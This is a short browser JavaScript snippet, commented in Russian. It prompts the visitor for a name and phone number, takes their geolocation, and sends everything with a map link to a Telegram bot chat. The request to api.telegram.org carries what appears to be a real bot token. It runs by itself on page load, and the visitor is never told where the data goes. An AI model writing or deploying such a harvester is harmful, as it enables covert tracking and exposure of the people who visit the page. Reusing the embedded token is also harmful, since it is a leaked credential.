// Запрос имени пользователя
const userName = prompt("Введите ваше имя:") || "Аноним";

// Запрос номера телефона
const userPhone = prompt("Введите ваш номер телефона:") || "Не указан";

// Функция для получения геолокации
function getLocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            reject("Геолокация не поддерживается вашим браузером");
        } else {
            navigator.geolocation.getCurrentPosition(
                position => resolve(position.coords),
                error => reject(`Ошибка получения геолокации: ${error.message}`)
            );
        }
    });
}

// Отправка данных
async function sendDataToTelegram() {
    try {
        const coords = await getLocation();
        const message = [
            `👤 Имя: ${userName}`,
            `📱 Телефон: ${userPhone}`,
            `📍 Координаты: ${coords.latitude}, ${coords.longitude}`,
            `🌍 Ссылка: https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`,
            `🕒 Время: ${new Date().toLocaleString()}`
        ].join("\n");

        await fetch(`https://api.telegram.org/bot<8150387871:AAFIQrkNg_rZBZmNJ-HE0qAL_eIHtqtkzJo>/sendMessage?chat_id=<CHAT_ID>&text=${encodeURIComponent(message)}`);
        alert("Данные успешно отправлены!");
    } catch (error) {
        console.error("Ошибка:", error);
        alert("Произошла ошибка при отправке данных");
    }
}

// Вызов функции
sendDataToTelegram();